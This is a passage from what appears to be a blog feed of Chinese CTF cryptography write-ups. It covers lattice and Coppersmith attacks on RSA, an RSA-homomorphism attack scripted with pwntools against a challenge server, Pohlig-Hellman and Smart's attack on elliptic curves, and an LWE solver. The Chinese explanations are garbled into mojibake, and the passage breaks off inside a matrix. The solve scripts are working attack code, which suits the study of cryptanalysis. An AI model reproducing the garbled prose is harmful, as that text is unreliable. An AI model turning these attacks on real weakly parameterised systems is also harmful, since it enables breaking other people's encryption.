æ‰€ä»¥ç°åœ¨åªéœ€è¦ä¸æ–­çš„è°ƒæ•´$R$çš„å¤§å°, ç›´åˆ°æ‰¾å‡ºä¸€ä¸ª$512 bit$çš„çœŸæ­£çš„$\\sqrt{q_0}$ ,æœ‰äº†$\\sqrt{q_0}$å°±èƒ½æ±‚å‡º$a$äº†, è§£å‡º$a$å‰©ä¸‹çš„å°±æ˜¯å·²çŸ¥$p$é«˜ä½äº† åšè¿™é¢˜çš„æ—¶å€™å‘ç°å¦‚æœåªç”¨å››ç»„æ•°æ®, ä¸ç®¡æ€ä¹ˆçš„è°ƒæ•´$R$, ä¹Ÿæ²¡æœ‰åŠæ³•æ‰¾å‡ºæƒ³è¦çš„é‚£ä¸ªå‘é‡å‡ºæ¥, ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºå‚æ•°çš„å¤§å°, å››ç»„æ•°æ®ç»™å‡ºçš„çº¦æŸä¸å¤Ÿå¼º? è§£å®ŒAGCDä¹‹åå°±èƒ½æ‹¿åˆ°ä¸€ä¸ªåŠ å¯†çš„flag, eå’Œphiä¸äº’ç´ , å‘ç°eæ˜¯$2^{12}$, ç›´æ¥å¼€12æ¬¡å¹³æ–¹æ ¹å°±è¡Œäº† exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import syssys.path.append(&quot;/home/k1rit0/CTF/&quot;)import myCrypto.AMM as AMMfrom sage.all import *from Crypto.Util.number import inverse, isPrime, long_to_bytesLAM = 380l = 5M = [[0 for _ in range(l)] for _ in range(l)]N = [21068286322889605292449387381402285403911455560141090214735354974440606624419616964297007580321013791067226167439872996226832500580037706653803152998537359002847432836899418650117306549893607343160006144352760334920785866221130409904894118963374929467323935674617670738402419178327965359202178162667267351040190371168301980935481660326630257816016921697149710082155701629870160350348818834688225753303057415885022226024601907498521621901308603324694768684738802528845831936410741399435491742825201984427922436831471812070309418640813794622730842698875782093607446798284303784522710493344963880678737688403891400189331, 12308853561607841041934092506744511689155586116240481655471529969953855274038227343811431655989608434591583673694139060863738492861944511267544267389946989849658784130545243679913412818685768313761630659910263680193434985838781131523993553907838129189461461476296694554655782825701774629683350764866069156868009043211117580921049441277102377562595106269789041165210135844474567428536421792003953066707002965308982249630472773112238349557943156998108879517471317999283500584387777397105486037127797366322210846034599129011995028171723686883387966414035624689126402104807914499946793228044511016295452985310557970379011, 30738697791225132085580847654714047571186902668616746842899304102159584623469816318757206927486219023390491315148910896488732403322767246394501024688827804510369382155878820868892068583525039291929122306306627213766241320525799308714371006850194133645674073652842238370607838910482032953868627367283394607836966578300168303793400060582848922857236410576441317474208136497407564188049755626445760675555940268390636610085726624705570165069943427799504990418468772678900305743541682004982830947893963522764021022122922104982911181491725457610355492465006313490505471915305370861395875195908816803244772843442663436627811, 8305502698327938163061403448570905343510072391121488812862051390404395134941843998819543534972233651342461635174480345500578515464031763529097882752145582280163441217012244252516496790390759043249994221367357315376275069348967721415258505344163223181510037360702185803627278919587509933485368201596116686196256578251198487468448008040978019816660838136301253757474040665970837583661727365857243232757366302995923446406792674664094421560455977644181219681801233665490911903627509944363786700632306093740157219837713108792604909612708233475959478546962262259340699913418281265092058666045625836471989209312154073075491, 9249057556737779363640590847304104073427145700484200097209450631890326978899167760679154628208658960714377959140386507599020762987984595928908203986925752986701463694818100098371494812801057184146507393471109418242580315774651644212154315684690259768215107765517606521494940441845123991021958309973443907208341450704221754039776849253367952771456447007511355415631917532484344389697848200615413029231558971975377100287746424454815515972611696776506127916905426006223842544245270081659891304287086426791583147370534686626291189249685625856952980692492700851557019098598454447260906380261199261945010423393013023715209 ]for i in range(l): N[i] = int(sqrt(N[i]))for i in range(1,l): M[i][i] = -N[0] M[0][i] = N[i]M[0][0] = 2 ** LAML = Matrix(M).LLL()[0]assert L[0] % 2 ** LAM == 0q = abs(L[0] // 2 ** LAM)n = N[0]a = (n - (n % q)) // q# Know high bit of pn = 9249057556737779363640590847304104073427145700484200097209450631890326978899167760679154628208658960714377959140386507599020762987984595928908203986925752986701463694818100098371494812801057184146507393471109418242580315774651644212154315684690259768215107765517606521494940441845123991021958309973443907208341450704221754039776849253367952771456447007511355415631917532484344389697848200615413029231558971975377100287746424454815515972611696776506127916905426006223842544245270081659891304287086426791583147370534686626291189249685625856952980692492700851557019098598454447260906380261199261945010423393013023715209 e = 65537c = 596355871374007258796739088580480254690421307398563449520929804224579804032978250178898982384142847223103176953609592214108362545413436815340326688408982175941755069859344738153840235542651636279657627294019566968304679361239665444560606473133283058393087609946086549065553264454684624204753050326115020520403436076532095607286695957435489522985881581820635688415133423515447960953517405315231071959346343447601273197470177184887138457495799503680274625485150493280857586565387473867813858817367137470006514777542969192548145776362722942018998084778630461770023286812913356191141099060132770816764636107436181833654_p = a**2 R = PolynomialRing(Zmod(n),'x')x = R.gens()[0]f = _p + xroots = f.small_roots(X=2 ** 368,beta = 0.4)if roots: p = _p + int(roots[0]) print(p)assert n % p == 0q = n // pphi = (p-1) * (q-1)d = inverse_mod(e,phi)print(long_to_bytes(pow(c,d,n)))p = 117235409029105051846806067899523247170361728684595002856792997268214583527481018331523314373480172502868245719103537926811678162691190783273715963938227870577908696266175564889962816950193051688136250287087726752359306820791879258724210723175953346754995614733931375012961016374642411090783817788045807125779 e = 4096c = 9565562547953889050875342796317230683573917021053842636334550812905648260474828549598393988661413478381057558054348342995403993026447829846151651076469025927491897151314215230367392957203050021568190862146104714972731651005427897872753163387978990574633850084765886249824258759820964357075803586150088309646 R = PolynomialRing(Zmod(p),'x')R1 = [c]R2 = []for _ in range(12): for r in R1: x = R.gens()[0] f = x ^ 2 - r roots = f.roots() if roots: for root in roots: R2.append(root[0]) R1 = R2 R2 = [] print(R1)for m in R1: print(long_to_bytes(m)) ezl1nearproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121from Crypto.Util.number import long_to_bytes , bytes_to_long , getPrime , inversefrom Crypto.Cipher import AESimport socketserver , signalimport randomimport stringfrom hashlib import sha256import osflag = 'aaaaaaaaaaaaaaaa'q = 2**24def getrandbits(n): return bytes_to_long(os.urandom(n // 8+1)) &gt;&gt; (8-n%8)class server(socketserver.BaseRequestHandler): def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg , bytes): msg += b'\\n' else: msg += '\\n' msg = msg.encode() self.request.sendall(msg) def proof_of_work(self): random.seed(os.urandom(8)) proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) _hexdigest = sha256(proof.encode()).hexdigest() self._send(f&quot;sha256(XXXX+{proof[4:]}) == {_hexdigest}&quot;.encode()) self._send(b'Give me XXXX: ') x = self._recv() if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: self.send('wrong') return False return True def genrsa(self): _p = getPrime(1024) _q = getPrime(1024) self.n = _p * _q self.e = 65537 self.d = inverse(self.e , (_p-1)*(_q-1)) def to_vec(self,num , length): vec = [] while length &gt; 0: vec = [num % q] + vec num //= q length -= 1 return vec def to_mat(self,numlist): M =[] for i in numlist: M.append(self.to_vec(i , 40)) return M def enc(self, key , m): key = self.to_mat(key) res = [] for i in range(40): temp = 0 for j in range(16): temp += m[j]* key[j][i] temp %= q res.append(temp) return res def handle(self): # signal.alarm(120) # self.proof_of_work() self.genrsa() self._send(str(self.n)) self._send(str(self.e)) secret = [1] + [2*getrandbits(23)-1 for _ in range(15)] print(secret) self._send(b'Please generate key for me and I will give you my secret.But you have only two chances.') for i in range(2): key = [] f0 = getrandbits(480) print(f0) key.append(f0) self._send(str(pow(f0 , self.e , self.n))) f0 += f0 &lt;&lt; 480 for j in range(15): self._send('key'+str(i+1) + ':') c = int(self._recv()) m = pow(c , self.d , self.n) f = m - f0 f %= self.n key.append(f) c = self.enc(key , secret) self._send('Thanks, here is your cipher:' + str(c)) self._send(b'do you know the secret?') guess = [int(i) for i in self._recv().split(b' ')] if len(guess) == 16: for j in range(16): if guess[j] != secret[j]: break else: self._send(b'congratulations. here is your flag:') self._send(flag) return 0 else: self._send(b'L1near don\\'t care.') class ForkedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 10000 server = ForkedServer((HOST, PORT), server) server.allow_reuse_address = True server.serve_forever() æµç¨‹æœ‰ç‚¹é•¿, å¤§æ¦‚å°±æ˜¯éšæœºç”Ÿæˆä¸€ä¸ªå‘é‡$secret = (1,s_0,s_1,\\cdots,s_{13},s_{14})$, æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯å¾—åˆ°è¿™ä¸ª ä¸€å¼€å§‹ä»–ä¼šç”Ÿæˆä¸€ä¸ª$f_0$, å¹¶é€šè¿‡RSAåŠ å¯†ç„¶åç»™æˆ‘ä»¬å¯†æ–‡ ä¸­é—´ä»–ä¼šè®©æˆ‘ä»¬è¾“å…¥15ä¸ª$key$, ä½†æ˜¯è¿™åäº”ä¸ª$key$ä¸æ˜¯ç›´æ¥å’±ä»¬è¾“å…¥ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆçš„, ä»–ä¼šç»è¿‡ä¸€ä¸ªRSAçš„è§£å¯† æœ€å$f_0$åŠ ä¸Šæˆ‘ä»¬è¾“å…¥çš„15ä¸ª$key$ä¸€èµ·ç”Ÿæˆä¸€ä¸ª$16 \\cdot 40$çš„çŸ©é˜µ$M$(ä¸€ä¸ªkeyå°±ç”Ÿæˆä¸€è¡Œ) ç„¶åè®¡ç®—å¯†æ–‡$$secret \\cdot M = (c_0,c_1,\\cdots,c_{38},c_{39})$$è¿™é‡Œå¯†æ–‡æˆ‘ä»¬æ˜¯çŸ¥é“çš„, æˆ‘ä»¬åªéœ€è¦å¼„åˆ°$M$å°±èƒ½å¾—åˆ°$secret$äº† è€Œè¿™é‡Œ$M$é™¤äº†ç¬¬ä¸€è¡Œ, éƒ½æ˜¯æˆ‘ä»¬è‡ªå·±æ„é€ çš„, ä½†æ˜¯æ¯”è¾ƒéš¾æ§åˆ¶,å› ä¸ºå®é™…ä¸Šçš„keyå’Œæˆ‘ä»¬ä¼ è¿‡å»å·®ä¸€ä¸ªè§£å¯†, ä½†æ˜¯æˆ‘ä»¬æœ‰ä¸€ä¸ª$f_0$çš„å¯†æ–‡, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨RSAçš„ä¹˜æ³•åŒæ€å°±æ„é€ $k\\cdot f_0$, è¿™ä¸ª$k$æƒ³æ˜¯å¤šå°‘å°±æ˜¯å¤šå°‘. è€Œä¸”è§‚å¯Ÿ$M$çš„ç”Ÿæˆ, æˆ‘ä»¬å‘ç°åªè¦å¾—åˆ°ç¬¬ä¸€è¡Œçš„æ‰€æœ‰æ•°, æˆ‘ä»¬å°±èƒ½è¿˜åŸå›$f_0$, å› ä¸º$secret$çš„ç¬¬ä¸€ä¸ªå›ºå®šæ˜¯1, è€Œ$M$çš„ç¬¬ä¸€è¡Œåªæœ‰åé¢20ä¸ªæ‰æœ‰æ•°å­—, å‰é¢çš„20ä¸ªéƒ½æ˜¯0, æ‰€ä»¥æˆ‘ä»¬åªè¦è®©åé¢çš„20åˆ—é™¤äº†ç¬¬ä¸€è¡Œéƒ½æ˜¯0å°±å¯ä»¥å¾—åˆ°$f_0$äº†. è€Œä¸”, æˆ‘ä»¬å¯ä»¥ä¼ $Enc(q^if_0)$, è®©$M$çš„åé¢å‡ è¡Œçš„ç”Ÿæˆå°±æ˜¯ç¬¬ä¸€è¡Œçš„æ•°å­—å¾€å‰æ¨iä¸ª, æ‰€ä»¥æˆ‘ä»¬è®©$i=20$å°±èƒ½æ¨åˆ°åˆšå¥½åªæœ‰ç¬¬ä¸€è¡Œçš„åé¢$20$åˆ—æ˜¯æœ‰æ•°å­—çš„. é‚£ä¹ˆå¤§æ¦‚çš„æ€è·¯æœ‰äº†, æ„é€ $M$, 1. å¿…é¡»å¾—å¯é€†, æ‰èƒ½æ±‚$secret$. 2. åé¢20åˆ—æ˜¯0$$(1,s_0,s_1,\\cdots,s_{13},s_{14})\\begin{pmatrix}0&amp;0&amp;\\cdots&amp;0&amp;a_0&amp;a_1&amp;\\cdots&amp;a_{19} \\k_{1,0}&amp;k_{1,1}&amp;\\cdots&amp;k_{1,19}&amp;0&amp;0&amp;\\cdots&amp;0 \\&amp;&amp;&amp;\\cdots \\k_{15,0}&amp;k_{15,1}&amp;\\cdots&amp;k_{15,19}&amp;0&amp;0&amp;\\cdots&amp;0 \\end{pmatrix}\\=(c_0,c_1,\\cdots,c_{19},a_0,a_1,\\cdots,a_{19})$$æˆ‘ä»¬éœ€è¦è¿™ä¸ª$M$å¯é€†, å°±æ˜¯è¦æ»¡ç§©, å°±æ¯æ¬¡ä¼ çš„æ—¶å€™å†åŠ ä¸€ä¸ªéšæœºçš„ç³»æ•°$j$å°±è¡Œäº†, ä¹Ÿå°±æ˜¯ä¼ $Enc(jq^if_0)$ æ„é€ å‡ºäº†ä¸Šé¢è¿™ä¸ª, å°±èƒ½åˆ©ç”¨$a_0,\\cdots,a_{19}$è¿˜åŸ$f_0$, å†ç”¨$f_0$ç”Ÿæˆæ•´ä¸ª$M$, æœ€åæ±‚ä¸ª$M^{-1}$ç®—å›$secret$å³å¯ exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from sage.all import *import reimport pwnimport randomq = 2**24def shiftf0(enc_f0,i): a = 2 ** 480 + 1 + (i+1) * q**20 return ((enc_f0 * pow(a,e,n)) % n)def to_vec(num , length): vec = [] while length &gt; 0: vec = [num % q] + vec num //= q length -= 1 return vecdef to_mat(numlist): M =[] for i in numlist: M.append(to_vec(i , 40)) return MCON = pwn.remote('172.27.176.1',10000)resp = CON.recvuntil('key1:\\n').decode().split('\\n')n = int(resp[0])e = 65537enc = int(resp[3])for _ in range(14): CON.sendline(str(shiftf0(enc,_)).encode()) resp = CON.recvuntil('key1:\\n').decode() print(_,resp)CON.sendline(str(shiftf0(enc,_+1)).encode())resp = CON.recvuntil('key2:\\n').decode().split('\\n')_res = resp[0][29:-1].split(',')res =[]for i in _res: res += [int(i)]f0 = 0for i in res[-20:]: f0 += i f0 = f0 &lt;&lt; 24f0 = f0 &gt;&gt; 24key = [f0]+ [((i+1)* q**20 * f0 ) % n for i in range(15)]M = matrix(Zmod(q),to_mat(key))print(M.solve_left(vector(res)))","link":"/2021/09/07/writeup-for-2021-WMCTF/"},{"title":"writeup-for-2021-ç¬¬äº”ç©ºé—´","text":"ç®—æ˜¯ç¬¬ä¸€æ¬¡AKå¯†ç ? eccproblem1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465print 'Try to solve the 3 ECC'from secret import flagfrom Crypto.Util.number import *assert(flag[:5]=='flag{')flag = flag[5:-1]num1 = bytes_to_long(flag[:7])num2 = bytes_to_long(flag[7:14])num3 = bytes_to_long(flag[14:])def ECC1(num): p = 146808027458411567 A = 46056180 B = 2316783294673 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print 'P:',P print 'Q:',Qdef ECC2(num): p = 1256438680873352167711863680253958927079458741172412327087203 #import random #A = random.randrange(389718923781273978681723687163812) #B = random.randrange(816378675675716537126387613131232121431231) A = 377999945830334462584412960368612 B = 604811648267717218711247799143415167229480 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print 'P:',P print 'Q:',Q factors, exponents = zip(*factor(E.order())) primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-1] print primes dlogs = [] for fac in primes: t = int(int(P.order()) / int(fac)) dlog = discrete_log(t*Q,t*P,operation=&quot;+&quot;) dlogs += [dlog] print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog)) #calculates discrete logarithm for each prime order print num print crt(dlogs,primes)def ECC3(num): p = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b A = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07 B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print 'P:',P print 'Q:',QECC1(num1)print '=============='ECC2(num2)print '=============='ECC3(num3) ä¸æ‡‚, ä¸ºå•¥é¢˜ç›®é‡Œè¿˜æœ‰PolligHellmançš„ä»£ç çš„ æç¤º? å‰ä¸¤ä¸ªeccå°±ç”¨PolligHellmanå°±èƒ½è§£å‡ºæ¥ å‰©ä¸‹æœ€åä¸€ä¸ªç”¨smartâ€™s attack å‚è€ƒè®ºæ–‡https://wstein.org/edu/2010/414/projects/novotney.pdf exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from sage.all import *from Crypto.Util.number import long_to_bytes,bytes_to_long# Define the curvep = 146808027458411567a = 46056180b = 2316783294673# Generatorg_x = 119851377153561800g_y = 50725039619018388F = FiniteField(p)E = EllipticCurve(F,[a,b])G = E.point((g_x, g_y))n = G.order()print(n.factor())'''2^2 * 7 * 193 * 110603 * 122811083'''primes = [4 , 7 , 193 , 110603 , 122811083]x=22306318711744209y=111808951703508717C = E.point((x, y))dlogs = []for fac in primes: t = int( n // fac ) dlog = discrete_log( t*C , t*G, operation='+' ) dlogs += [dlog] print(&quot;factor:&quot;+str(fac)+&quot;,Discrete Log:&quot;+str(dlog))nC = crt(dlogs,primes)print(long_to_bytes(nC))# ç¬¬äºŒæ¡æ›²çº¿è·Ÿç¬¬ä¸€æ¡æ›²çº¿æ˜¯ä¸€æ ·çš„ å°±ä¸å†æŠ„ä¸€éäº†from Crypto.Util.number import long_to_bytesp = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1bA = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2E =EllipticCurve(GF(p),[A,B])g_x = 10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861g_y = 8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610G = E.point((g_x, g_y))x=964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927y=5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537C = E.point((x, y))def HenselLift(P,p,prec): E = P.curve() Eq = E.change_ring(QQ) Ep = Eq.change_ring(Qp(p,prec)) x_P,y_P = P.xy() x_lift = ZZ(x_P) y_lift = ZZ(y_P) x, y, a1, a2, a3, a4, a6 = var('x,y,a1,a2,a3,a4,a6') f(a1,a2,a3,a4,a6,x,y) = y^2 + a1*x*y + a3*y - x^3 - a2*x^2 - a4*x - a6 g(y) = f(ZZ(Eq.a1()),ZZ(Eq.a2()),ZZ(Eq.a3()),ZZ(Eq.a4()),ZZ(Eq.a6()),ZZ(x_P),y) gDiff = g.diff() for i in range(1,prec): uInv = ZZ(gDiff(y=y_lift)) u = uInv.inverse_mod(p^i) y_lift = y_lift - u*g(y_lift) y_lift = ZZ(Mod(y_lift,p^(i+1))) y_lift = y_lift+O(p^prec) return Ep([x_lift,y_lift]) def SmartAttack(P,Q,p,prec): E = P.curve() Eqq = E.change_ring(QQ) Eqp = Eqq.change_ring(Qp(p,prec)) P_Qp = HenselLift(P,p,prec) Q_Qp = HenselLift(Q,p,prec) p_times_P = p*P_Qp p_times_Q=p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P k = Mod(k,p) return k long_to_bytes(SmartAttack(G,C,p,8)) doublesageproblem1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from sage.modules.free_module_integer import IntegerLatticefrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSamplerfrom sage.crypto.lwe import LWEfrom sage.crypto.lwe import samples import numpy as npimport signaldef Question(n,m,para_D,para_e): signal.alarm(600) print('[+] Question:') # m=n^2-2 q=next_prime(n^2) D=DiscreteGaussianDistributionIntegerSampler(para_D*n) lwe=LWE(n=n, q=q, D=D) Z=[lwe() for _ in range(m)] A=matrix([a for (a,c) in Z]).transpose() C=vector([c for (a,c) in Z]) print('[+] The following matrix operations are modulus',q) print('\\n[+] Matrix A of size',n,'*',m,':'); print(A) print('\\n[+] Vector C of size',1,'*',m,':'); print(np.array(C)) E=lwe._LWE__s*A-C E=[int(e) for e in E] E=vector([e if e &lt;= floor(q/2) else e-q for e in E]) E_norm=E.norm().n()*para_e print('[+] Please give an integer vector x of size',1,'*',m,'(format [1 2 3] or [1, 2, 3]), such that the norm of vector x*A-C &lt;=',E_norm,', where operations are modulus',q,':') k=GF(q)^n x=k(0) u=input() try: u=np.matrix(u) for i in range(n): x[i]=u[0,i] except: print('[+] Wrong format, exit.') exit() E=x*A-C E=[int(e) for e in E] E=vector([e if e &lt;= floor(q/2) else e-q for e in E]) tmp=E.norm().n() print('[+] The norm of vector x*A-C is', tmp,',', tmp&lt;E_norm,'.\\n') if not tmp&lt;E_norm: exit() def ReadFlag(): print('flag{**********}')Question(5, 23, 1.5, 1.1)Question(15, 143, 1.5, 3)ReadFlag() å°±æ˜¯ä¸¤å±‚lweâ€¦.. ç›´æ¥å½“æˆlweåšå°±å¥½äº† expæ‰‹åŠ¨æŠŠè¿œç¨‹ç»™çš„å‘é‡å’ŒçŸ©é˜µæ‰”è¿›ä¸‹é¢çš„è„šæœ¬é‡Œ æŠŠè·‘å‡ºæ¥çš„å‘é‡ä¼ ç»™æœåŠ¡å™¨å°±è¡Œäº† 123456789101112131415161718192021from sage.modules.free_module_integer import IntegerLatticedef BabaisClosestPlaneAlgorithm(L, w): G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - wp = 227M = Matrix([[55,78,211,140,203,28,205,71,148,55,43,66,34,108,99,6,202,138,90,77,128,85,88,189,135,42,157,159,204,51,211,77,2,64,60,137,53,29,214,153,142,138,0,148,53,115,73,178,78,81,219,103,23,64,146,61,98,86,157,102,222,219,2,69,65,183,93,208,156,80,164,70,200,106,128,123,1,29,175,224,62,166,62,122,102,21,3,166,41,26,164,78,199,194,56,82,6,135,99,107,104,178,32,12,57,205,63,14,159,145,133,19,96,145,20,172,49,213,200,111,148,5,45,6,25,19,81,199,52,119,10,12,101,140,189,61,190,168,23,181,74,153,111],[168,115,109,184,137,28,38,86,70,99,113,24,148,189,43,211,9,3,139,50,120,39,192,179,92,193,96,100,124,22,214,81,216,80,55,208,184,145,132,133,177,84,64,164,121,87,191,134,38,28,2,168,66,194,117,215,83,146,217,224,54,9,188,175,39,45,18,89,68,76,20,226,155,58,70,97,209,135,210,85,108,184,7,92,226,187,205,2,88,71,92,187,186,90,182,14,58,98,32,104,141,29,131,200,85,44,30,159,4,33,113,33,49,201,54,31,158,75,225,109,30,95,142,35,204,55,203,215,156,224,2,171,87,183,175,178,168,22,24,201,28,3,20],[152,97,15,188,52,6,149,182,167,134,60,31,154,36,6,209,28,221,144,88,161,144,13,162,90,110,95,216,196,44,133,124,75,218,170,14,84,186,127,142,59,3,185,132,147,63,121,100,10,88,103,145,3,47,179,127,127,150,133,120,90,84,186,140,21,49,93,167,70,140,161,196,29,207,128,217,125,214,28,211,66,44,33,118,166,43,220,131,26,209,108,171,41,205,163,62,20,127,184,7,95,18,125,66,94,26,33,40,68,49,197,111,46,215,97,204,98,69,206,225,193,116,43,85,153,61,184,178,195,220,127,164,168,45,42,22,104,194,19,0,111,138,191],[54,169,0,103,88,221,86,108,36,171,128,139,198,103,154,83,193,115,84,41,84,136,75,90,20,109,219,22,107,180,136,13,203,98,133,141,57,181,139,226,161,25,21,198,3,200,17,63,223,165,54,74,76,84,189,89,84,95,191,168,91,141,109,148,186,40,5,113,0,71,167,54,29,219,55,64,3,162,34,56,138,109,65,174,43,20,158,22,175,93,136,26,193,60,180,216,24,185,56,86,205,123,31,126,120,84,47,67,165,36,217,153,192,121,142,120,153,39,188,209,119,35,223,155,49,200,215,187,10,111,138,116,223,49,14,127,100,61,197,134,143,164,192],[125,88,118,197,140,200,191,110,135,76,71,33,223,183,34,100,16,53,190,153,185,201,91,118,118,51,10,214,142,223,77,215,11,1,109,166,210,32,63,129,109,146,9,68,28,224,73,43,159,35,185,100,126,218,88,90,111,79,177,54,149,31,86,82,203,11,104,211,200,205,75,226,220,36,31,177,191,200,210,92,60,92,40,96,23,129,99,209,57,55,224,12,154,200,118,25,168,27,28,93,91,175,107,35,22,123,110,86,87,62,149,79,116,28,125,164,114,88,217,80,199,211,113,20,29,68,124,141,157,11,160,85,189,223,135,77,186,172,11,55,40,125,187],[32,42,151,123,149,215,156,87,47,27,160,145,114,118,78,113,205,152,173,92,109,62,185,201,149,216,220,72,208,55,78,1,56,177,147,30,68,223,194,126,155,59,24,10,26,8,104,211,214,119,208,141,188,65,82,130,173,190,107,156,57,157,16,72,43,154,174,52,7,22,39,163,219,134,9,49,20,75,189,182,161,32,82,15,10,22,46,33,145,120,161,216,6,185,131,226,56,53,219,173,150,94,93,10,64,99,124,195,207,220,96,80,207,155,193,223,68,166,99,189,67,78,222,15,76,35,206,19,114,149,1,141,63,20,145,56,214,212,44,186,88,141,204],[114,4,210,127,90,181,97,17,51,156,182,58,167,185,111,54,67,137,213,165,219,211,143,4,65,129,91,190,67,180,163,29,221,185,100,225,103,190,133,208,90,11,123,141,174,93,18,177,124,146,50,107,25,64,219,63,44,186,152,14,25,141,107,188,106,168,136,94,154,6,41,168,193,137,92,179,203,36,85,213,138,149,225,62,89,78,10,180,25,155,38,223,82,221,190,223,42,144,186,49,169,45,161,137,152,180,152,77,97,222,104,98,167,88,116,174,67,75,81,119,205,3,180,24,159,190,102,157,199,152,145,146,131,208,58,121,178,95,211,214,163,196,104],[32,174,189,30,141,182,192,20,103,100,191,80,151,124,185,166,41,32,39,34,169,35,80,108,89,67,150,16,109,8,102,122,85,224,175,115,104,20,116,112,192,66,173,212,29,19,102,66,116,37,146,19,102,65,98,187,0,142,56,192,143,91,20,193,183,107,215,144,184,57,193,86,50,65,220,129,51,212,78,16,91,190,37,116,102,120,178,56,193,146,218,64,142,178,225,207,129,110,104,170,156,148,182,91,220,207,193,124,45,98,57,96,38,67,99,97,149,7,181,138,192,220,195,14,99,152,38,70,186,8,123,204,127,1,39,181,159,75,122,54,41,137,41],[115,170,6,225,99,21,139,118,133,16,175,94,163,163,222,67,220,75,215,142,8,167,86,20,94,7,169,5,145,208,213,153,38,202,191,10,66,133,92,91,95,28,38,86,127,215,3,206,67,170,14,153,108,219,0,10,64,78,74,223,199,180,16,13,169,109,224,213,142,65,12,29,100,109,104,102,131,24,202,92,70,11,215,41,35,112,39,10,182,131,120,95,112,49,116,81,43,49,54,30,225,63,167,16,118,75,193,50,125,224,161,127,186,88,196,3,0,215,219,217,168,221,206,63,86,133,153,216,16,152,39,19,183,155,200,80,33,48,150,104,193,137,189],[19,127,92,102,59,196,66,49,7,211,120,87,95,196,93,17,195,184,187,87,0,151,169,150,82,67,24,85,12,77,20,10,211,203,57,181,156,148,195,123,90,135,14,200,226,135,17,208,15,176,168,140,161,217,2,125,91,167,157,118,100,167,148,155,114,208,159,123,136,95,89,170,21,130,82,10,47,136,88,45,224,23,55,207,200,124,123,113,105,67,80,147,55,127,200,158,209,10,53,135,100,161,27,154,2,80,174,95,12,73,154,17,92,106,206,85,171,69,56,212,213,211,221,166,72,188,78,113,147,26,148,141,41,96,81,31,95,169,164,7,134,125,174],[158,177,225,122,164,132,16,150,170,166,67,2,192,194,28,104,59,148,150,106,179,217,159,94,107,217,209,225,226,39,138,219,163,116,48,40,63,140,8,139,38,144,63,94,205,210,186,217,214,141,22,186,198,114,211,219,82,34,122,92,34,182,156,170,58,41,150,36,212,197,38,131,28,110,48,224,19,109,185,142,186,14,126,156,105,33,79,93,162,183,156,135,43,144,114,8,158,102,145,194,26,29,183,205,219,196,207,142,176,21,225,50,36,22,176,100,40,125,120,114,74,34,176,98,121,77,116,200,85,96,167,63,215,80,1,218,94,29,65,202,42,45,114],[130,124,40,71,145,69,216,122,162,57,134,79,103,8,137,110,8,103,216,172,74,219,141,99,78,104,143,110,130,49,45,54,160,15,196,67,109,208,30,21,195,46,91,38,52,115,173,77,87,111,215,100,91,220,21,4,34,203,173,9,171,129,170,202,9,185,47,198,141,90,216,156,215,99,99,185,194,217,171,155,189,54,14,7,162,173,58,79,34,103,137,208,62,165,104,143,80,33,136,39,111,176,202,207,3,15,173,139,50,49,9,165,170,78,154,180,45,153,40,157,94,73,86,207,26,199,152,12,62,192,175,60,136,96,31,171,114,8,95,17,87,39,177],[51,36,34,69,152,211,6,89,157,60,65,58,78,22,92,23,172,105,12,218,154,171,96,201,41,53,204,215,23,211,216,98,80,45,90,27,177,9,74,169,23,197,221,74,119,152,158,180,73,138,192,149,37,147,80,26,154,180,